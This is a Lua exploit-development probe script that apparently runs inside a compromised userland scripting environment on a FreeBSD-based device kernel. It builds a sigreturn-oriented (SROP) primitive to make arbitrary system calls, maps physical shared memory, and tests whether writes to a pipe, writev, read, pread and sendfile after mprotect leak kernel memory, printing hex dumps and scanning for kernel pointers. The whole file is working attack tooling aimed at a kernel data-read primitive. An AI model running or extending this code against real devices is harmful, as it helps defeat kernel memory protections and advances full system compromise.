-- CRASH_CLASS: LOW
-- PROBE 177a: copyin after mprotect on physhm pages
--
-- 176a confirmed: mprotect(PROT_READ)=0 but user-mode read crashes.
-- 174a showed: write(pipe,physhm)=-1 (EFAULT) WITHOUT mprotect.
-- Key test: does copyin work AFTER mprotect changes vm_map_entry flags?
-- copyin checks vm_map protection, not hardware PTE.
-- Also tests: read(physhm_fd), sendfile, pread on the fd itself.

print("=== PROBE 177a: COPYIN AFTER MPROTECT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex64(val)
    local h, l = get_hi_lo(val)
    return string.format("0x%X%08X", h, l)
end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

-- SROP setup
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function wq(a,v) memory.write_qword(a,v) end
local function wd(a,v) memory.write_dword(a,v) end
local function rd(a) return to_num(memory.read_dword(a)) end
local function rq(a) return memory.read_qword(a) end

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

-- GPU buffer
local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end
print("gpu=" .. hex64(gpu))

-- Zero out test areas
for i = 0, 0xFF, 4 do wd(gpu + 0x60000 + i, 0) end
for i = 0, 0xFF, 4 do wd(gpu + 0x70000 + i, 0) end

-- Step 1: Open physhm
print("")
print("--- STEP 1: PHYSHM_OPEN ---")
local rv = srop(629, uint64(1), uint64(2), uint64(0), uint64(0))
local fd = rv and to_num(rv) or -1
print("fd=" .. fd)
if fd < 0 then print("FAILED") return end

-- Step 2: Create pipe
print("")
print("--- STEP 2: PIPE ---")
rv = srop(42)
local pipe_rd = rv and to_num(rv) or -1
print("pipe_rd=" .. pipe_rd .. " pipe_wr=" .. (pipe_rd + 1))
if pipe_rd < 0 then print("pipe FAILED") return end

-- Step 3: mmap physhm
print("")
print("--- STEP 3: MMAP ---")
rv = srop(477, uint64(0), uint64(0x4000), uint64(3),
    uint64(1), uint64(fd), uint64(0))
local mm_h, mm_l = 0, 0
if rv then mm_h, mm_l = get_hi_lo(rv) end
print("physhm_va=" .. hex64(rv))
if mm_h == 0 and mm_l == 0 then print("NULL") return end
local physhm_va = uint64(string.format("0x%X%08X", mm_h, mm_l))

-- Step 4: BASELINE — copyin BEFORE mprotect (should be -1 like 174a)
print("")
print("--- STEP 4: COPYIN BEFORE MPROTECT ---")
rv = srop(4, uint64(pipe_rd + 1), physhm_va, uint64(8))
local wr_before = rv and to_num(rv) or -999
print("write(pipe, physhm, 8) BEFORE mprotect = " .. wr_before)

-- Drain pipe if anything was written
if wr_before > 0 then
    srop(3, uint64(pipe_rd), ga(0x50000), uint64(wr_before))
end

-- Step 5: mprotect
print("")
print("--- STEP 5: MPROTECT ---")
rv = srop(74, physhm_va, uint64(0x4000), uint64(1))  -- PROT_READ
local mp = rv and to_num(rv) or -999
print("mprotect(PROT_READ)=" .. mp)
if mp ~= 0 then print("mprotect FAILED") return end

-- Step 6: COPYIN AFTER MPROTECT — the critical test!
print("")
print("--- STEP 6: COPYIN AFTER MPROTECT ---")
rv = srop(4, uint64(pipe_rd + 1), physhm_va, uint64(0x100))
local wr_after = rv and to_num(rv) or -999
print("write(pipe, physhm, 256) AFTER mprotect = " .. wr_after)

if wr_after > 0 then
    print("")
    print("!!! COPYIN SUCCEEDED AFTER MPROTECT !!!")
    print("!!! THIS IS A KERNEL DATA READ PRIMITIVE !!!")
    print("")

    -- Read data from pipe into GPU buffer
    rv = srop(3, uint64(pipe_rd), ga(0x60000), uint64(wr_after))
    local got = rv and to_num(rv) or -1
    print("recv from pipe: " .. got .. " bytes")

    if got > 0 then
        -- Hex dump first 256 bytes
        print("HEX DUMP:")
        for row = 0, math.min(15, math.floor((got-1)/16)) do
            local line = string.format("+%03X:", row * 16)
            local ascii = ""
            for i = 0, 15 do
                local off = row * 16 + i
                if off < got then
                    local dw = rd(gpu + 0x60000 + (off - off % 4))
                    local b = math.floor(dw / (256 ^ (off % 4))) % 256
                    line = line .. string.format(" %02X", b)
                    if b >= 0x20 and b < 0x7F then
                        ascii = ascii .. string.char(b)
                    else
                        ascii = ascii .. "."
                    end
                end
            end
            print(line .. "  " .. ascii)
        end

        -- Scan for kernel pointers
        print("")
        print("KERNEL POINTER SCAN:")
        local kptr_count = 0
        for off = 0, got - 8, 8 do
            local qv = rq(gpu + 0x60000 + off)
            local qh, ql = get_hi_lo(qv)
            if qh >= 0xFFFF8000 and qh < 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                print("  KPTR +" .. string.format("%04X", off) .. " = " .. hex64(qv))
            end
        end
        print("total kernel pointers: " .. kptr_count)

        -- Also check for userland pointers
        local uptr_count = 0
        for off = 0, got - 8, 8 do
            local qv = rq(gpu + 0x60000 + off)
            local qh, ql = get_hi_lo(qv)
            if qh > 0 and qh < 0x800 then
                uptr_count = uptr_count + 1
                if uptr_count <= 8 then
                    print("  UPTR +" .. string.format("%04X", off) .. " = " .. hex64(qv))
                end
            end
        end
        print("total userland pointers: " .. uptr_count)
    end
else
    print("copyin still EFAULT after mprotect")
    print("")
    print("--- STEP 6b: WRITEV AFTER MPROTECT ---")
    -- Try writev with iov pointing to physhm
    local IOV = 0x80000
    wq(gpu + IOV, physhm_va)
    wq(gpu + IOV + 8, uint64(0x100))
    rv = srop(121, uint64(pipe_rd + 1), ga(IOV), uint64(1))
    local wv = rv and to_num(rv) or -999
    print("writev(pipe, [physhm,256], 1)=" .. wv)

    if wv > 0 then
        print("!!! WRITEV COPYIN SUCCEEDED !!!")
        rv = srop(3, uint64(pipe_rd), ga(0x60000), uint64(wv))
        local got2 = rv and to_num(rv) or -1
        print("recv=" .. got2)
        if got2 > 0 then
            for row = 0, math.min(7, math.floor((got2-1)/16)) do
                local line = string.format("+%03X:", row * 16)
                for i = 0, 15 do
                    local off = row * 16 + i
                    if off < got2 then
                        local dw = rd(gpu + 0x60000 + (off - off % 4))
                        local b = math.floor(dw / (256 ^ (off % 4))) % 256
                        line = line .. string.format(" %02X", b)
                    end
                end
                print(line)
            end
        end
    end
end

-- Step 7: read/pread from physhm fd directly
print("")
print("--- STEP 7: READ FROM PHYSHM FD ---")
-- Zero the target area
for i = 0, 0xFF, 4 do wd(gpu + 0x70000 + i, 0) end

rv = srop(3, uint64(fd), ga(0x70000), uint64(0x100))
local rd_ret = rv and to_num(rv) or -999
print("read(physhm_fd, buf, 256)=" .. rd_ret)

if rd_ret > 0 then
    print("!!! PHYSHM FD READ SUCCEEDED !!!")
    for row = 0, math.min(7, math.floor((rd_ret-1)/16)) do
        local line = string.format("+%03X:", row * 16)
        for i = 0, 15 do
            local off = row * 16 + i
            if off < rd_ret then
                local dw = rd(gpu + 0x70000 + (off - off % 4))
                local b = math.floor(dw / (256 ^ (off % 4))) % 256
                line = line .. string.format(" %02X", b)
            end
        end
        print(line)
    end
end

-- Step 8: pread at offset 0
print("")
print("--- STEP 8: PREAD ---")
for i = 0, 0xFF, 4 do wd(gpu + 0x70000 + i, 0) end
rv = srop(475, uint64(fd), ga(0x70000), uint64(0x100), uint64(0))
local pr = rv and to_num(rv) or -999
print("pread(physhm_fd, buf, 256, 0)=" .. pr)

if pr > 0 then
    print("!!! PREAD SUCCEEDED !!!")
    for row = 0, math.min(7, math.floor((pr-1)/16)) do
        local line = string.format("+%03X:", row * 16)
        for i = 0, 15 do
            local off = row * 16 + i
            if off < pr then
                local dw = rd(gpu + 0x70000 + (off - off % 4))
                local b = math.floor(dw / (256 ^ (off % 4))) % 256
                line = line .. string.format(" %02X", b)
            end
        end
        print(line)
    end
end

-- Step 9: sendfile from physhm fd to pipe
print("")
print("--- STEP 9: SENDFILE ---")
local SB = 0x80100
wq(gpu + SB, uint64(0))
rv = srop(393, uint64(fd), uint64(pipe_rd + 1), uint64(0), uint64(0x100),
    uint64(0), ga(SB), uint64(0))
local sf = rv and to_num(rv) or -999
print("sendfile(physhm_fd, pipe_wr, 0, 256)=" .. sf)
if sf == 0 then
    local sent = to_num(rq(gpu + SB))
    print("sbytes=" .. sent)
    if sent > 0 then
        print("!!! SENDFILE SUCCEEDED !!!")
        rv = srop(3, uint64(pipe_rd), ga(0x70000), uint64(sent))
        local got3 = rv and to_num(rv) or -1
        print("recv=" .. got3)
    end
end

-- Step 10: mprotect to PROT_READ|PROT_WRITE, then try copyin again
print("")
print("--- STEP 10: MPROTECT RW + COPYIN ---")
rv = srop(74, physhm_va, uint64(0x4000), uint64(3))  -- PROT_READ|PROT_WRITE
local mp2 = rv and to_num(rv) or -999
print("mprotect(PROT_RW)=" .. mp2)

if mp2 == 0 then
    -- Try write to pipe again
    rv = srop(4, uint64(pipe_rd + 1), physhm_va, uint64(8))
    local wr2 = rv and to_num(rv) or -999
    print("write(pipe, physhm, 8) after RW=" .. wr2)

    if wr2 > 0 then
        rv = srop(3, uint64(pipe_rd), ga(0x60000), uint64(wr2))
        local got4 = rv and to_num(rv) or -1
        if got4 > 0 then
            print("data=" .. hex64(rq(gpu + 0x60000)))
        end
    end
end

-- Cleanup
srop(6, uint64(pipe_rd))
srop(6, uint64(pipe_rd + 1))
srop(73, physhm_va, uint64(0x4000))
srop(6, uint64(fd))

print("")
print("pid_post=" .. to_num(make_syscall(20)()))
print("=== DONE ===")
